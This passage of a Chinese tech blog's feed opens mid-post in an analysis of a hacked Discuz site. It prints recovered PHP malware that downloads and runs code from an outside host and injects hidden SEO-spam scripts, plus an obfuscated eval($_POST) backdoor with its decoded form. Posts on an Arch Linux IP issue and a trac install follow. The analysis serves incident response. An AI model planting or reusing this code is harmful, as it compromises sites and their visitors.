&lt;span style="color: #729fcf; font-weight: bold;"&gt;function&lt;/span&gt; &lt;span style="color: #edd400; font-weight: bold; font-style: italic;"&gt;getdata&lt;/span&gt;($&lt;span style="color: #eeeeec;"&gt;data_url&lt;/span&gt;){
&lt;span style="color: #729fcf; font-weight: bold;"&gt;if&lt;/span&gt; (&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;function_exists(&lt;/span&gt;&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'curl_exec'&lt;/span&gt;)) {
$&lt;span style="color: #eeeeec;"&gt;sp_curl&lt;/span&gt; = @&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;curl_init(&lt;/span&gt;);
&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;curl_setopt(&lt;/span&gt;$&lt;span style="color: #eeeeec;"&gt;sp_curl&lt;/span&gt;, &lt;span style="color: #f57900; font-weight: bold;"&gt;CURLOPT_URL&lt;/span&gt;, $&lt;span style="color: #eeeeec;"&gt;data_url&lt;/span&gt;);
&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;curl_setopt(&lt;/span&gt;$&lt;span style="color: #eeeeec;"&gt;sp_curl&lt;/span&gt;, &lt;span style="color: #f57900; font-weight: bold;"&gt;CURLOPT_HEADER&lt;/span&gt;, &lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;0&lt;/span&gt;);
&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;curl_setopt(&lt;/span&gt;$&lt;span style="color: #eeeeec;"&gt;sp_curl&lt;/span&gt;, &lt;span style="color: #f57900; font-weight: bold;"&gt;CURLOPT_CONNECTTIMEOUT&lt;/span&gt;, &lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;5&lt;/span&gt;);
&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;curl_setopt(&lt;/span&gt;$&lt;span style="color: #eeeeec;"&gt;sp_curl&lt;/span&gt;, &lt;span style="color: #f57900; font-weight: bold;"&gt;CURLOPT_RETURNTRANSFER&lt;/span&gt;, &lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;1&lt;/span&gt;);
$&lt;span style="color: #eeeeec;"&gt;contents&lt;/span&gt; = @&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;curl_exec(&lt;/span&gt;$&lt;span style="color: #eeeeec;"&gt;sp_curl&lt;/span&gt;);
@&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;curl_close(&lt;/span&gt;$&lt;span style="color: #eeeeec;"&gt;sp_curl&lt;/span&gt;);
}&lt;span style="color: #729fcf; font-weight: bold;"&gt;elseif&lt;/span&gt;(&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;function_exists(&lt;/span&gt;&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'stream_context_create'&lt;/span&gt;)) {
$&lt;span style="color: #eeeeec;"&gt;sp_cont&lt;/span&gt; = &lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;array(&lt;/span&gt;&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'http'&lt;/span&gt; =&lt;span style="color: #8ae234;"&gt;&amp;gt;&lt;/span&gt; &lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;array(&lt;/span&gt;&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'method'&lt;/span&gt; =&amp;gt; &lt;span style="color: #ad7fa8; font-style: italic;"&gt;'GET'&lt;/span&gt;,&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'timeout'&lt;/span&gt; =&amp;gt; &lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;5&lt;/span&gt;));
$&lt;span style="color: #eeeeec;"&gt;sp_stre&lt;/span&gt; = @&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;stream_context_create(&lt;/span&gt;$&lt;span style="color: #eeeeec;"&gt;sp_cont&lt;/span&gt;);
$&lt;span style="color: #eeeeec;"&gt;contents&lt;/span&gt; = @&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;file_get_contents(&lt;/span&gt;$&lt;span style="color: #eeeeec;"&gt;data_url&lt;/span&gt;, &lt;span style="color: #8ae234;"&gt;false&lt;/span&gt;, $&lt;span style="color: #eeeeec;"&gt;sp_stre&lt;/span&gt;);
}&lt;span style="color: #729fcf; font-weight: bold;"&gt;else&lt;/span&gt;{
$&lt;span style="color: #eeeeec;"&gt;handle&lt;/span&gt; = @&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;fopen(&lt;/span&gt;$&lt;span style="color: #eeeeec;"&gt;data_url&lt;/span&gt;, &lt;span style="color: #ad7fa8; font-style: italic;"&gt;"rb"&lt;/span&gt;);&lt;span style="color: #ffff00; background-color: #ff0000; font-weight: bold;"&gt; &lt;/span&gt;
$&lt;span style="color: #eeeeec;"&gt;contents&lt;/span&gt; = @&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;stream_get_contents(&lt;/span&gt;$&lt;span style="color: #eeeeec;"&gt;handle&lt;/span&gt;);&lt;span style="color: #ffff00; background-color: #ff0000; font-weight: bold;"&gt; &lt;/span&gt;
@&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;fclose(&lt;/span&gt;$&lt;span style="color: #eeeeec;"&gt;handle&lt;/span&gt;);
}
&lt;span style="color: #729fcf; font-weight: bold;"&gt;return&lt;/span&gt; $&lt;span style="color: #eeeeec;"&gt;contents&lt;/span&gt;;
}
&lt;span style="color: #729fcf; font-weight: bold;"&gt;function&lt;/span&gt; &lt;span style="color: #edd400; font-weight: bold; font-style: italic;"&gt;show&lt;/span&gt;($&lt;span style="color: #eeeeec;"&gt;fileDir&lt;/span&gt;){
$&lt;span style="color: #eeeeec;"&gt;filename&lt;/span&gt;=$&lt;span style="color: #eeeeec;"&gt;fileDir&lt;/span&gt;&lt;span style="color: #f57900; font-weight: bold;"&gt;.&lt;/span&gt;&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;md5(&lt;/span&gt;$&lt;span style="color: #8ae234;"&gt;_SERVER&lt;/span&gt;[&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'HTTP_HOST'&lt;/span&gt;].$&lt;span style="color: #8ae234;"&gt;_SERVER&lt;/span&gt;[&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'REQUEST_URI'&lt;/span&gt;]);
&lt;span style="color: #729fcf; font-weight: bold;"&gt;if&lt;/span&gt;(&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;is_file(&lt;/span&gt;$&lt;span style="color: #eeeeec;"&gt;filename&lt;/span&gt;)){
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt; &lt;span style="background-color: #404040;"&gt; &lt;/span&gt; $&lt;span style="color: #eeeeec;"&gt;fp&lt;/span&gt;=@&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;fopen(&lt;/span&gt;$&lt;span style="color: #eeeeec;"&gt;filename&lt;/span&gt;,&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'r'&lt;/span&gt;);
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt; &lt;span style="background-color: #404040;"&gt; &lt;/span&gt; $&lt;span style="color: #eeeeec;"&gt;data&lt;/span&gt;=@&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;fread(&lt;/span&gt;$&lt;span style="color: #eeeeec;"&gt;fp&lt;/span&gt;,&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;filesize(&lt;/span&gt;$&lt;span style="color: #eeeeec;"&gt;filename&lt;/span&gt;));
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt; &lt;span style="background-color: #404040;"&gt; &lt;/span&gt; @&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;fclose(&lt;/span&gt;$&lt;span style="color: #eeeeec;"&gt;fp&lt;/span&gt;);
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt; &lt;span style="background-color: #404040;"&gt; &lt;/span&gt; &lt;span style="color: #729fcf; font-weight: bold;"&gt;if&lt;/span&gt;(&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;empty(&lt;/span&gt;$&lt;span style="color: #eeeeec;"&gt;data&lt;/span&gt;)) {@&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;unlink(&lt;/span&gt;$&lt;span style="color: #eeeeec;"&gt;filename&lt;/span&gt;);&lt;span style="color: #729fcf; font-weight: bold;"&gt;return&lt;/span&gt;;}
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt; &lt;span style="background-color: #404040;"&gt; &lt;/span&gt; &lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;dec0de(&lt;/span&gt;$&lt;span style="color: #eeeeec;"&gt;fileDir&lt;/span&gt;,$&lt;span style="color: #eeeeec;"&gt;data&lt;/span&gt;);
} &lt;span style="color: #729fcf; font-weight: bold;"&gt;else&lt;/span&gt; {
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt; &lt;span style="background-color: #404040;"&gt; &lt;/span&gt; $&lt;span style="color: #eeeeec;"&gt;data&lt;/span&gt;=&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;getdata(&lt;/span&gt;&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'http://bet.discuz.com.de/w0shiOo7.php?HOST='&lt;/span&gt;.$&lt;span style="color: #8ae234;"&gt;_SERVER&lt;/span&gt;[&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'HTTP_H&lt;/span&gt;&lt;span style="text-decoration: underline;"&gt;OST']);&lt;/span&gt;
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt; &lt;span style="background-color: #404040;"&gt; &lt;/span&gt; $&lt;span style="color: #eeeeec;"&gt;fp&lt;/span&gt;=@&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;fopen(&lt;/span&gt;$&lt;span style="color: #eeeeec;"&gt;filename&lt;/span&gt;,&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'w'&lt;/span&gt;);
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt; &lt;span style="background-color: #404040;"&gt; &lt;/span&gt; @&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;fwrite(&lt;/span&gt;$&lt;span style="color: #eeeeec;"&gt;fp&lt;/span&gt;,$&lt;span style="color: #eeeeec;"&gt;data&lt;/span&gt;);
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt; &lt;span style="background-color: #404040;"&gt; &lt;/span&gt; @&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;fclose(&lt;/span&gt;$&lt;span style="color: #eeeeec;"&gt;fp&lt;/span&gt;);
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt; &lt;span style="background-color: #404040;"&gt; &lt;/span&gt; &lt;span style="color: #729fcf; font-weight: bold;"&gt;if&lt;/span&gt;(&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;strlen(&lt;/span&gt;$&lt;span style="color: #eeeeec;"&gt;data&lt;/span&gt;) &amp;gt; &lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;1000&lt;/span&gt;) {
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt; &lt;span style="background-color: #404040;"&gt; &lt;/span&gt; &lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;dec0de(&lt;/span&gt;$&lt;span style="color: #eeeeec;"&gt;fileDir&lt;/span&gt;,$&lt;span style="color: #eeeeec;"&gt;data&lt;/span&gt;);
&lt;span style="background-color: #404040;"&gt; &lt;/span&gt; &lt;span style="background-color: #404040;"&gt; &lt;/span&gt; }
}}
&lt;span style="color: #729fcf; font-weight: bold;"&gt;if&lt;/span&gt;(!&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;in_array(&lt;/span&gt;$&lt;span style="color: #eeeeec;"&gt;IP&lt;/span&gt;,$&lt;span style="color: #eeeeec;"&gt;KIP&lt;/span&gt;)){
&lt;span style="color: #729fcf; font-weight: bold;"&gt;foreach&lt;/span&gt;($&lt;span style="color: #eeeeec;"&gt;KBot&lt;/span&gt; &lt;span style="color: #729fcf; font-weight: bold;"&gt;as&lt;/span&gt; $&lt;span style="color: #eeeeec;"&gt;KBots&lt;/span&gt;){&lt;span style="color: #729fcf; font-weight: bold;"&gt;if&lt;/span&gt;(&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;stristr(&lt;/span&gt;$&lt;span style="color: #eeeeec;"&gt;Bot&lt;/span&gt;,$&lt;span style="color: #eeeeec;"&gt;KBots&lt;/span&gt;)){
&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;show(&lt;/span&gt;$&lt;span style="color: #eeeeec;"&gt;fileDir&lt;/span&gt;);
}}&lt;span style="color: #729fcf; font-weight: bold;"&gt;foreach&lt;/span&gt;($&lt;span style="color: #eeeeec;"&gt;Key&lt;/span&gt; &lt;span style="color: #729fcf; font-weight: bold;"&gt;as&lt;/span&gt; $&lt;span style="color: #eeeeec;"&gt;Keys&lt;/span&gt;){
&lt;span style="color: #729fcf; font-weight: bold;"&gt;if&lt;/span&gt;(&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;stristr(&lt;/span&gt;$&lt;span style="color: #eeeeec;"&gt;Ref&lt;/span&gt;,$&lt;span style="color: #eeeeec;"&gt;Keys&lt;/span&gt;)){
&lt;span style="color: #729fcf; font-weight: bold;"&gt;echo&lt;/span&gt; &lt;span style="color: #ad7fa8; font-style: italic;"&gt;"&amp;lt;div style='display:none'&amp;gt;&amp;lt;script language='javascript' src='http://count3&lt;/span&gt;&lt;span style="text-decoration: underline;"&gt;1.51yes.com/click.aspx?id=310940343&amp;amp;logo=1' charset='gb2312'&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;script type='text/javascript' src='http://api.discuz.com.de/Seo.js'&amp;gt;&amp;lt;/script&amp;gt;";}}}      &lt;/span&gt;
&lt;/pre&gt;

&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;     
   &#19978;&#38754;&#20195;&#30721;&#30340;&#30446;&#30340;&#23601;&#26159;&#19979;&#36733;&#24694;&#24847;&#20195;&#30721;&#24182;&#25191;&#34892;&#12290;  
&lt;/p&gt;
&lt;/div&gt;

&lt;/div&gt;

&lt;div id="outline-container-4" class="outline-3"&gt;
&lt;h3 id="sec-4"&gt;&#32487;&#32493;&#25490;&#26597;&lt;/h3&gt;
&lt;div class="outline-text-3" id="text-4"&gt;


&lt;p&gt;
   &#36890;&#36807;&#27604;&#36739;svn&#20013;&#30340;&#20195;&#30721;&#19982;&#29616;&#32593;&#30340;&#20195;&#30721;&#36824;&#21457;&#29616;&#20102;&#19968;&#20010;&#26032;&#30340;&#21518;&#38376;&#31243;&#24207;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;uc_client/control/class.php&lt;/code&gt;




&lt;pre class="src src-php"&gt;&lt;span style="color: #729fcf;"&gt;&amp;lt;?php&lt;/span&gt; $&lt;span style="color: #eeeeec;"&gt;mt&lt;/span&gt;=&lt;span style="color: #ad7fa8; font-style: italic;"&gt;"mFsKCleRfU"&lt;/span&gt;; $&lt;span style="color: #eeeeec;"&gt;ojj&lt;/span&gt;=&lt;span style="color: #ad7fa8; font-style: italic;"&gt;"IEBleldle"&lt;/span&gt;; $&lt;span style="color: #eeeeec;"&gt;hsa&lt;/span&gt;=&lt;span style="color: #ad7fa8; font-style: italic;"&gt;"E9TVFsnd2VuJ10p"&lt;/span&gt;; $&lt;span style="color: #eeeeec;"&gt;fnx&lt;/span&gt;=&lt;span style="color: #ad7fa8; font-style: italic;"&gt;"Ow=="&lt;/span&gt;; $&lt;span style="text-decoration: underline;"&gt;zk = str_replace("d","","sdtdrd_redpdldadcde"); $ef = $zk("z", "", "zbazsze64_zdzeczodze"); $dva = $zk("p","","pcprpepaptpe_fpupnpcptpipopn"); $zvm = $dva('', $ef($zk("le", "", $ojj.$mt.$hsa.$fnx))); $zvm(); ?&amp;gt;&lt;/span&gt;
&lt;/pre&gt;


&lt;/li&gt;
&lt;li&gt;&#35299;&#30721;&#21518;&#30340;&#32467;&#26524;




&lt;pre class="src src-php"&gt;@&lt;span style="color: #eeeeec; background-color: #2e3436;"&gt;eval(&lt;/span&gt;$&lt;span style="color: #8ae234;"&gt;_POST&lt;/span&gt;[&lt;span style="color: #ad7fa8; font-style: italic;"&gt;'wen'&lt;/span&gt;]);
&lt;/pre&gt;

&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;   
   &#19978;&#38754;&#30340;&#33050;&#26412;&#21487;&#20197;&#27880;&#20837;&#20219;&#24847;&#30340;&#20195;&#30721;&#12290;
&lt;/p&gt;
&lt;/div&gt;

&lt;/div&gt;

&lt;div id="outline-container-5" class="outline-3"&gt;
&lt;h3 id="sec-5"&gt;&#21518;&#35760;&lt;/h3&gt;
&lt;div class="outline-text-3" id="text-5"&gt;


&lt;p&gt;   
   &#36825;&#27425;&#21457;&#29616;&#30340;&#24694;&#24847;&#20195;&#30721;&#27880;&#20837;&#24212;&#35813;&#26159;&#20043;&#21069;&#30340;&#19968;&#27425; &lt;code&gt;nginx&lt;/code&gt; &#21644; &lt;code&gt;php&lt;/code&gt; &lt;a href="http://www.oschina.net/translate/10-tips-for-securing-nginx#translate_28443"&gt;&#23433;&#20840;&#28431;&#27934;&lt;/a&gt; &#24341;&#36215;&#65292;&#24403;&#26102;&#30001; &lt;code&gt;WooYun.org&lt;/code&gt; &#27719;&#25253;&#65292;&#21407;&#26469;&#24050;&#32463;&#34987;&#24694;&#24847;&#29992;&#25143;&#31181;&#19979;&#20102;&#36825;&#20123;&#21518;&#38376;&#12290;
&lt;/p&gt;&lt;/div&gt;
&lt;/div&gt;
</content></entry><entry><title type="html">Archlinux网络接口上出现两个IP</title><author><name>nil</name></author><link href="http://blog.kankanan.com/posts/2014/03/12_archlinux7f517edc63a553e34e0a51fa73b04e244e2aip.html"/><updated>2014-03-12T11:32:00Z</updated><published>2014-03-12T11:32:00Z</published><id>posts/2014/03/12_archlinux7f517edc63a553e34e0a51fa73b04e244e2aip.html</id><category scheme="/tags/archlinux.html" term="archlinux" label="archlinux"/><category scheme="/tags/network.html" term="network" label="network"/><content type="html">&lt;ul&gt;
&lt;li&gt;&#21457;&#29616;&#20004;&#20010;IP

&lt;p&gt;
    &#25105;&#30340;&#30005;&#33041;&#26159;&#30452;&#25509;&#36830;&#21040;&#20844;&#21496;&#30340;&#22681;&#19978;&#30340;&#32593;&#21475;&#19978;&#32593;&#30340;&#65292;&#22312;&#27979;&#35797;&#36335;&#30001;&#22120;&#30340;&#26102;&#20505;&#65292;&#25105;&#25226;&#36335;&#30001;&#22120;&#30340;WAN&#21475;&#25509;&#22681;&#19978;&#30340;&#32593;&#21475;&#65292;&#28982;&#21518;&#30005;&#33041;&#36830;&#21040;&#36335;&#30001;&#22120;&#30340;LAN&#21475;&#19978;&#65292;&#19978;&#32593;&#27491;&#24120;&#12290;&#26597;&#30475;&#20998;&#37197;&#21040;&#30340;IP&#20026;192.168.111.2&#65292;&#36335;&#30001;&#22120;&#30340;IP&#20026;192.168.111.1&#65292; &#24819;&#21040;&#25105;&#19968;&#30452;&#29992; &lt;code&gt;192.168.90.73&lt;/code&gt; &#36825;&#20010;IP&#65292;&#26377;&#20123;&#37197;&#32622;&#20063;&#20381;&#36182;&#36825;&#20010;IP&#65292;&#25152;&#20197;&#36824;&#24819;&#20998;&#21040;&#36825;&#20010;IP&#65292;&#25152;&#20197;&#25226;&#36335;&#30001;&#22120;&#30340;DHCP&#20570;&#20102;&#35774;&#32622;&#65292;&#36335;&#30001;&#22120;IP&#25913;&#20026;192.168.90.74&#65292;&#20998;&#37197;&#30340;IP&#33539;&#22260;&#20026;192.168.90.71-192.168.90.73&#65292;&#20877;&#27425;&#37325;&#36830;&#30005;&#33041;&#20998;&#37197;&#30340;IP&#20026;192.168.90.71&#65292;&#28982;&#21518;&#21457;&#29616;&#19978;&#19981;&#20102;&#32593;&#20102;&#65292;&#27983;&#35272;&#22120;&#19978;&#36755;&#20837;&#36335;&#30001;&#22120;&#30340;IP&#65288;192.168.90.74&#65289;&#31455;&#28982;&#25171;&#24320;&#20102;&#25105;&#26426;&#22120;&#65288;192.168.90.71&#65289;&#19978;&#24314;&#30340;WEB&#26381;&#21153;&#65292;&#20854;&#20182;&#20154;&#36830;&#36825;&#20010;&#32593;&#32476;&#21364;&#21487;&#20197;&#36890;&#36807;192.168.90.74&#36825;&#20010;IP&#27491;&#24120;&#25171;&#24320;&#36335;&#30001;&#22120;&#30028;&#38754;&#65292;&#26368;&#32456;&#36890;&#36807;&#8220;ip address show&#8221;&#36825;&#20010;&#21629;&#20196;&#21457;&#29616;&#25105;&#30340;&#32593;&#21475;&#19978;&#26377;&#20004;&#20010;IP&#65288;192.168.90.71&#12289;192.168.90.74&#65289;&#65292;=ipconfig= &#21644;&#20854;&#23427;GUI&#24037;&#20855;&#21482;&#33021;&#30475;&#21040;&#31532;&#19968;&#20010;IP&#12290;
&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&#31532;&#20108;&#20010;IP&#26159;&#24590;&#20040;&#26469;&#30340;&#65311;

&lt;p&gt;
    &#25235;&#21253;&#20998;&#26512;&#20102;&#19968;&#19979;DHCP&#32593;&#32476;&#21253;&#65292;&#21482;&#32473;&#20998;&#37197;&#20102;192.168.90.71&#36825;&#20010;IP&#65292;&#30475;&#26469;192.168.90.74&#36825;&#20010;IP&#26159;&#25105;&#26426;&#22120;&#19978;&#37197;&#32622;&#30340;&#65292;&#20110;&#26159;&#25628;&#32034;/etc&#12289;/var&#19979;&#30340;&#25991;&#20214;&#65292;&#26368;&#21518;&#22312;/var/log/journal/*/system.journal&#20013;&#25214;&#21040;&#20102;&#26085;&#24535;&#65306;
&lt;/p&gt;



&lt;pre class="example"&gt;NetworkManager[375]: &amp;lt;debug&amp;gt; [1394509845.924245] [nm-system.c:280] sync_addresses(): (eno1): adding address '192.168.90.74/24'
&lt;/pre&gt;


&lt;p&gt;
    &#28982;&#21518;&#22312;NetworkManager&#30340;&#37197;&#32622;&#25991;&#20214; &lt;code&gt;/etc/NetworkManager/system-connections/Profile 1&lt;/code&gt; &#20013;&#25214;&#21040;&#20102;&#30456;&#20851;&#37197;&#32622;&#65306;
&lt;/p&gt;



&lt;pre class="example"&gt;[ipv4]
method=auto
address1=192.168.90.74/24,192.168.90.2
&lt;/pre&gt;


&lt;p&gt;
    &#21024;&#38500;&#25481; &lt;code&gt;address1&lt;/code&gt; &#21518;&#65292;&#20877;&#37325;&#36830;&#32593;&#32476;&#65292;&#23601;&#21482;&#26377;&#19968;&#20010;IP&#20102;&#12290;
&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

</content></entry><entry><title type="html">开源项目管理系统：trac</title><author><name>nil</name></author><link href="http://blog.kankanan.com/posts/2014/03/10_5f006e90987976ee7ba174067cfb7edfff1atrac.html"/><updated>2014-03-10T00:44:00Z</updated><published>2014-03-10T00:44:00Z</published><id>posts/2014/03/10_5f006e90987976ee7ba174067cfb7edfff1atrac.html</id><category scheme="/tags/python.html" term="python" label="python"/><category scheme="/tags/trac.html" term="trac" label="trac"/><content type="html">&lt;p&gt;
  &#26368;&#36817;&#36127;&#36131;&#20026;&#20844;&#21496;&#25645;&#24314;&#39033;&#30446;&#31649;&#29702;&#31995;&#32479;&#65292;&#26377;&#22914;&#19979;&#35201;&#27714;&#65306;
&lt;/p&gt;&lt;ul&gt;
&lt;li&gt;&#25903;&#25345;BUG&#31649;&#29702;

&lt;/li&gt;
&lt;li&gt;&#25903;&#25345;&#24080;&#21495;&#31649;&#29702;

&lt;/li&gt;
&lt;li&gt;&#25903;&#25345;WIKI

&lt;/li&gt;
&lt;li&gt;&#25903;&#25345;&#20219;&#21153;&#20998;&#37197;

&lt;/li&gt;
&lt;li&gt;&#25903;&#25345;&#20013;&#25991;
&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;
  &#30001;&#20110;&#26102;&#38388;&#32039;&#36843;&#65292;&#24863;&#35273; &lt;code&gt;redmine&lt;/code&gt; &#30028;&#38754;&#26356;&#28418;&#20142;&#65292;&#30456;&#20851;&#36164;&#26009;&#20063;&#22909;&#25214;&#65292;&#32780;&#19988;&#24080;&#21495;&#31649;&#29702;&#12289;&#20013;&#25991;&#25903;&#25345;&#26041;&#38754;&#30340;&#24456;&#19981;&#38169;&#65292;&#25152;&#20197;&#36873;&#25321;&#20102; &lt;code&gt;redmine&lt;/code&gt; &#12290;&#20854;&#23454;&#24515;&#37324;&#38754;&#19968;&#30452;&#24076;&#26395;&#36873;&#30340;&#26159;&#22522;&#20110; &lt;code&gt;python&lt;/code&gt; &#24320;&#21457;&#30340;&#31995;&#32479;&#65292;&#19968;&#26041;&#38754;&#33258;&#24050;&#21916;&#27426; &lt;code&gt;python&lt;/code&gt; &#65292;&#21478;&#22806;&#22242;&#38431;&#20013;&#23545; &lt;code&gt;python&lt;/code&gt; &#29087;&#24713;&#30340;&#20154;&#27604;&#36739;&#22810;&#65292;&#36825;&#26679;&#21518;&#38754;&#38656;&#35201;&#20570;&#20108;&#27425;&#24320;&#21457;&#26102;&#20250;&#23481;&#26131;&#19968;&#20123;&#12290;
&lt;/p&gt;
&lt;p&gt;
  &lt;code&gt;trac&lt;/code&gt; &#32473;&#20154;&#30340;&#31532;&#19968;&#24863;&#35273;&#26159;&#22826;&#36807;&#20110;&#31616;&#21333;&#31895;&#31961;&#20102;&#12290;&#30028;&#38754;&#26420;&#23454;&#31616;&#27905;&#23578;&#21487;&#25509;&#21463;&#12289;&#28436;&#31034;&#31449;&#28857;&#20013;&#25991;&#21270;&#19981;&#24443;&#24213;&#12289;&#33258;&#24050;&#23433;&#35013;&#30340;&#26102;&#20505;&#36739;&#20043; &lt;code&gt;redmine&lt;/code&gt; &#26356;&#26159;&#30933;&#30933;&#32458;&#32458;&#12290;=trac= &#20351;&#29992; &lt;code&gt;Babel&lt;/code&gt; &#36827;&#34892;&#22810;&#35821;&#35328;&#25903;&#25345;&#65292;&#24403;&#21069;&#30340;trac&#31283;&#23450;&#29256;&#65288;1.0&#65289;&#23384;&#22312;&#20013;&#25991;&#25903;&#25345;&#26041;&#38754;&#30340;Bug&#65306;&lt;a href="http://trac.edgewall.org/ticket/10903"&gt;Wrong `NullTranslations` class in functional tests&lt;/a&gt; &#65292;&#25105;&#22312;&#23433;&#35013;&#36807;&#31243;&#20013;&#23601;&#36935;&#21040;&#20102;&#65292;&#27491;&#26159;&#36825;&#20010;&#38382;&#39064;&#25165;&#35273;&#24471;&#20808;&#30740;&#31350;&#19968;&#19979; &lt;code&gt;Babel&lt;/code&gt; &#65292;&#20110;&#26159;&#26377;&#20102;&#19978;&#19968;&#31687;&#25991;&#31456; &#12298;&lt;a href="http://blog.kankanan.com/posts/2014/03/09_python5e94752856fd96455316ff1ababel.html"&gt;python&#24212;&#29992;&#22269;&#38469;&#21270;&#65306;Babel&lt;/a&gt;&#12299;&#65292; &lt;code&gt;trac&lt;/code&gt; &#19979;&#19968;&#29256;&#65288;1.1&#65289;&#23545;&#36825;&#20010;&#38382;&#39064;&#36827;&#34892;&#20102;&#20462;&#22797;&#12290; &#32593;&#32476;&#19978;&#26377;&#24456;&#22810;&#20154;&#23545; &lt;code&gt;trac&lt;/code&gt; &#22840;&#36190;&#26377;&#21152;&#65292;&#21478;&#22806; &lt;code&gt;trac&lt;/code&gt; &#36824;&#26377;&#25345;&#32493;&#38598;&#25104;&#30340;&#25554;&#20214;&#65306; &lt;a href="http://bitten.edgewall.org/"&gt;Bitten&lt;/a&gt; &#65292; &#22312;&#23545; &lt;code&gt;Babel&lt;/code&gt; &#26377;&#19968;&#23450;&#20102;&#35299;&#21518;&#65292;&#25105;&#32456;&#20110;&#40723;&#27668;&#21191;&#27668;&#30740;&#31350;&#36215; &lt;a href="http://trac.edgewall.org/"&gt;trac&lt;/a&gt; &#12290;
&lt;/p&gt;

&lt;div id="outline-container-1" class="outline-3"&gt;
&lt;h3 id="sec-1"&gt;&#23433;&#35013;&#26368;&#26032;&#29256; &lt;code&gt;trac&lt;/code&gt;&lt;/h3&gt;
&lt;div class="outline-text-3" id="text-1"&gt;


&lt;ul&gt;
&lt;li&gt;&#20351;&#29992;&#23398;&#20064; &lt;code&gt;Babel&lt;/code&gt; &#26102;&#24314;&#30340;&#34394;&#25311;&#29615;&#22659;




&lt;pre class="src src-sh"&gt;workon LearnBabel
&lt;/pre&gt;


&lt;/li&gt;
&lt;li&gt;&#20174;&#26368;&#26032;&#28304;&#20195;&#30721;&#23433;&#35013; &lt;code&gt;trac&lt;/code&gt;




&lt;pre class="src src-sh"&gt;svn checkout http://svn.edgewall.org/repos/trac/trunk trac
&lt;span style="color: #729fcf;"&gt;cd&lt;/span&gt; trac
python ./setup.py install
&lt;/pre&gt;


&lt;/li&gt;
&lt;li&gt;&#24314;&#19968;&#20010;&#39033;&#30446;&#30475;&#30475;&#25928;&#26524;




&lt;pre class="src src-sh"&gt;&lt;span style="color: #729fcf;"&gt;cd&lt;/span&gt; ~/Examples/python
trac-admin LearnTrac initenv
tracd --port 8080 LearnTrac &amp;amp;
xdg-open http://localhost:8080
&lt;/pre&gt;

&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;
